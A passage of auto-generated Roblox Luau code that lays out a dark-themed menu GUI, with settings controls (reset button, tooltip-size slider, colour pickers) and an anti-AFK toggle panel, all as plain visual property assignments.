G2L["b5"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["b5"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.outlineStroke
G2L["b6"] = Instance.new("UIStroke", G2L["b5"]);
G2L["b6"]["Thickness"] = 2;
G2L["b6"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade
G2L["b7"] = Instance.new("CanvasGroup", G2L["b5"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade.UIGradient
G2L["b8"] = Instance.new("UIGradient", G2L["b7"]);
G2L["b8"]["Rotation"] = 90;
G2L["b8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text
G2L["b9"] = Instance.new("TextLabel", G2L["b3"]);
G2L["b9"]["ZIndex"] = 101;
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["TextSize"] = 14;
G2L["b9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["BackgroundTransparency"] = 1;
G2L["b9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b9"]["Text"] = [[Reset to Default]];
G2L["b9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text.text
G2L["ba"] = Instance.new("UIStroke", G2L["b9"]);
G2L["ba"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.fillbar
G2L["bb"] = Instance.new("Frame", G2L["b2"]);
G2L["bb"]["ZIndex"] = 100;
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Name"] = [[fillbar]];
G2L["bb"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize
G2L["bc"] = Instance.new("Frame", G2L["8d"]);
G2L["bc"]["ZIndex"] = 99;
G2L["bc"]["BorderSizePixel"] = 0;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bc"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["bc"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bc"]["Name"] = [[tooltipsize]];
G2L["bc"]["LayoutOrder"] = 4;
G2L["bc"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button
G2L["bd"] = Instance.new("TextButton", G2L["bc"]);
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["TextTransparency"] = 1;
G2L["bd"]["TextSize"] = 14;
G2L["bd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bd"]["ZIndex"] = 99;
G2L["bd"]["BackgroundTransparency"] = 1;
G2L["bd"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.UIPadding
G2L["be"] = Instance.new("UIPadding", G2L["bd"]);
G2L["be"]["PaddingTop"] = UDim.new(0, 2);
G2L["be"]["PaddingRight"] = UDim.new(0, 3);
G2L["be"]["PaddingLeft"] = UDim.new(0, 3);
G2L["be"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame
G2L["bf"] = Instance.new("Frame", G2L["bd"]);
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["bf"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["bf"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["bf"]["Name"] = [[sliderFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.outlineStroke
G2L["c0"] = Instance.new("UIStroke", G2L["bf"]);
G2L["c0"]["Thickness"] = 2;
G2L["c0"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade
G2L["c1"] = Instance.new("CanvasGroup", G2L["bf"]);
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade.UIGradient
G2L["c2"] = Instance.new("UIGradient", G2L["c1"]);
G2L["c2"]["Rotation"] = 90;
G2L["c2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.fillbar
G2L["c3"] = Instance.new("Frame", G2L["bf"]);
G2L["c3"]["ZIndex"] = 5;
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["c3"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Name"] = [[fillbar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text
G2L["c4"] = Instance.new("TextLabel", G2L["bd"]);
G2L["c4"]["ZIndex"] = 2;
G2L["c4"]["BorderSizePixel"] = 0;
G2L["c4"]["TextSize"] = 14;
G2L["c4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["BackgroundTransparency"] = 1;
G2L["c4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c4"]["Text"] = [[X/X]];
G2L["c4"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text.text
G2L["c5"] = Instance.new("UIStroke", G2L["c4"]);
G2L["c5"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL
G2L["c6"] = Instance.new("Frame", G2L["8d"]);
G2L["c6"]["ZIndex"] = 99;
G2L["c6"]["BorderSizePixel"] = 0;
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c6"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["c6"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c6"]["Name"] = [[tooltipsizeLABEL]];
G2L["c6"]["LayoutOrder"] = 3;
G2L["c6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text
G2L["c7"] = Instance.new("TextLabel", G2L["c6"]);
G2L["c7"]["TextWrapped"] = true;
G2L["c7"]["ZIndex"] = 99;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["TextSize"] = 14;
G2L["c7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["BackgroundTransparency"] = 1;
G2L["c7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["Text"] = [[Tooltip Size:]];
G2L["c7"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.UIPadding
G2L["c8"] = Instance.new("UIPadding", G2L["c7"]);
G2L["c8"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.text
G2L["c9"] = Instance.new("UIStroke", G2L["c7"]);
G2L["c9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker
G2L["ca"] = Instance.new("Frame", G2L["8d"]);
G2L["ca"]["BorderSizePixel"] = 0;
G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ca"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["ca"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ca"]["Name"] = [[centercolorpicker]];
G2L["ca"]["LayoutOrder"] = 2;
G2L["ca"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button
G2L["cb"] = Instance.new("TextButton", G2L["ca"]);
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["TextTransparency"] = 1;
G2L["cb"]["TextSize"] = 14;
G2L["cb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cb"]["ZIndex"] = 50;
G2L["cb"]["BackgroundTransparency"] = 1;
G2L["cb"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.UIPadding
G2L["cc"] = Instance.new("UIPadding", G2L["cb"]);
G2L["cc"]["PaddingTop"] = UDim.new(0, 3);
G2L["cc"]["PaddingRight"] = UDim.new(0, 3);
G2L["cc"]["PaddingLeft"] = UDim.new(0, 3);
G2L["cc"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame
G2L["cd"] = Instance.new("Frame", G2L["cb"]);
G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["cd"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["cd"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["cd"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["cd"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.outlineStroke
G2L["ce"] = Instance.new("UIStroke", G2L["cd"]);
G2L["ce"]["Thickness"] = 2;
G2L["ce"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.toggleFade
G2L["cf"] = Instance.new("CanvasGroup", G2L["cd"]);
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.toggleFade.UIGradient
G2L["d0"] = Instance.new("UIGradient", G2L["cf"]);
G2L["d0"]["Rotation"] = 90;
G2L["d0"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text
G2L["d1"] = Instance.new("TextLabel", G2L["ca"]);
G2L["d1"]["TextWrapped"] = true;
G2L["d1"]["ZIndex"] = 10;
G2L["d1"]["BorderSizePixel"] = 0;
G2L["d1"]["TextSize"] = 14;
G2L["d1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d1"]["BackgroundTransparency"] = 1;
G2L["d1"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d1"]["Text"] = [[Center Color Picker]];
G2L["d1"]["Name"] = [[text]];
G2L["d1"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text.UIPadding
G2L["d2"] = Instance.new("UIPadding", G2L["d1"]);
G2L["d2"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text.text
G2L["d3"] = Instance.new("UIStroke", G2L["d1"]);
G2L["d3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.UIPadding
G2L["d4"] = Instance.new("UIPadding", G2L["ca"]);
G2L["d4"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme
G2L["d5"] = Instance.new("Frame", G2L["8d"]);
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["d5"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Name"] = [[guicolortheme]];
G2L["d5"]["LayoutOrder"] = 2;
G2L["d5"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.UIPadding
G2L["d6"] = Instance.new("UIPadding", G2L["d5"]);
G2L["d6"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme
G2L["d7"] = Instance.new("TextButton", G2L["d5"]);
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["TextTransparency"] = 1;
G2L["d7"]["TextSize"] = 14;
G2L["d7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d7"]["ZIndex"] = 40;
G2L["d7"]["BackgroundTransparency"] = 1;
G2L["d7"]["Size"] = UDim2.new(0, 40, 1, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["Name"] = [[guicolortheme]];
G2L["d7"]["Position"] = UDim2.new(1, -40, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.colorFrame
G2L["d8"] = Instance.new("Frame", G2L["d7"]);
G2L["d8"]["ZIndex"] = 99;
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Name"] = [[colorFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.colorFrame.UIStroke
G2L["d9"] = Instance.new("UIStroke", G2L["d8"]);
G2L["d9"]["Transparency"] = 0.5;
G2L["d9"]["Thickness"] = 1.5;
G2L["d9"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.UIPadding
G2L["da"] = Instance.new("UIPadding", G2L["d7"]);
G2L["da"]["PaddingTop"] = UDim.new(0, 4);
G2L["da"]["PaddingRight"] = UDim.new(0, 5);
G2L["da"]["PaddingLeft"] = UDim.new(0, 5);
G2L["da"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text
G2L["db"] = Instance.new("TextLabel", G2L["d5"]);
G2L["db"]["TextWrapped"] = true;
G2L["db"]["ZIndex"] = 10;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["TextSize"] = 14;
G2L["db"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["db"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["db"]["BackgroundTransparency"] = 1;
G2L["db"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["Text"] = [[GUI Color:]];
G2L["db"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text.UIPadding
G2L["dc"] = Instance.new("UIPadding", G2L["db"]);
G2L["dc"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text.text
G2L["dd"] = Instance.new("UIStroke", G2L["db"]);
G2L["dd"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main
G2L["de"] = Instance.new("ScrollingFrame", G2L["3e"]);
G2L["de"]["Active"] = true;
G2L["de"]["BorderSizePixel"] = 0;
G2L["de"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["de"]["Name"] = [[Main]];
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["de"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["de"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["de"]["ScrollBarThickness"] = 0;
G2L["de"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside
G2L["df"] = Instance.new("Frame", G2L["de"]);
G2L["df"]["BorderSizePixel"] = 0;
G2L["df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["df"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["df"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["df"]["Name"] = [[rightside]];
G2L["df"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.UIListLayout
G2L["e0"] = Instance.new("UIListLayout", G2L["df"]);
G2L["e0"]["Padding"] = UDim.new(0, 5);
G2L["e0"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab
G2L["e1"] = Instance.new("Frame", G2L["df"]);
G2L["e1"]["BorderSizePixel"] = 0;
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["e1"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e1"]["Name"] = [[antiTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
G2L["e2"] = Instance.new("LocalScript", G2L["e1"]);
G2L["e2"]["Name"] = [[antiScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.UIListLayout
G2L["e3"] = Instance.new("UIListLayout", G2L["e1"]);
G2L["e3"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["e3"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.greystroke
G2L["e4"] = Instance.new("UIStroke", G2L["e1"]);
G2L["e4"]["ZIndex"] = 99;
G2L["e4"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["e4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e4"]["Name"] = [[greystroke]];
G2L["e4"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======
G2L["e5"] = Instance.new("Frame", G2L["e1"]);
G2L["e5"]["BorderSizePixel"] = 0;
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e5"]["Name"] = [[======ACCENT======]];
G2L["e5"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor
G2L["e6"] = Instance.new("Frame", G2L["e5"]);
G2L["e6"]["BorderSizePixel"] = 0;
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["e6"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["e6"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e6"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor.UICorner
G2L["e7"] = Instance.new("UICorner", G2L["e6"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk
G2L["e8"] = Instance.new("Frame", G2L["e1"]);
G2L["e8"]["BorderSizePixel"] = 0;
G2L["e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e8"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["e8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e8"]["Name"] = [[afk]];
G2L["e8"]["LayoutOrder"] = 2;
G2L["e8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button
G2L["e9"] = Instance.new("TextButton", G2L["e8"]);
G2L["e9"]["BorderSizePixel"] = 0;
G2L["e9"]["TextTransparency"] = 1;
G2L["e9"]["TextSize"] = 14;
G2L["e9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e9"]["ZIndex"] = 50;
G2L["e9"]["BackgroundTransparency"] = 1;
G2L["e9"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e9"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.UIPadding
G2L["ea"] = Instance.new("UIPadding", G2L["e9"]);
G2L["ea"]["PaddingTop"] = UDim.new(0, 3);
G2L["ea"]["PaddingRight"] = UDim.new(0, 3);
G2L["ea"]["PaddingLeft"] = UDim.new(0, 3);
G2L["ea"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame
G2L["eb"] = Instance.new("Frame", G2L["e9"]);
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["eb"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["eb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["eb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["eb"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.outlineStroke
G2L["ec"] = Instance.new("UIStroke", G2L["eb"]);
G2L["ec"]["Thickness"] = 2;
G2L["ec"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade
G2L["ed"] = Instance.new("CanvasGroup", G2L["eb"]);
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade.UIGradient
G2L["ee"] = Instance.new("UIGradient", G2L["ed"]);
G2L["ee"]["Rotation"] = 90;
G2L["ee"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


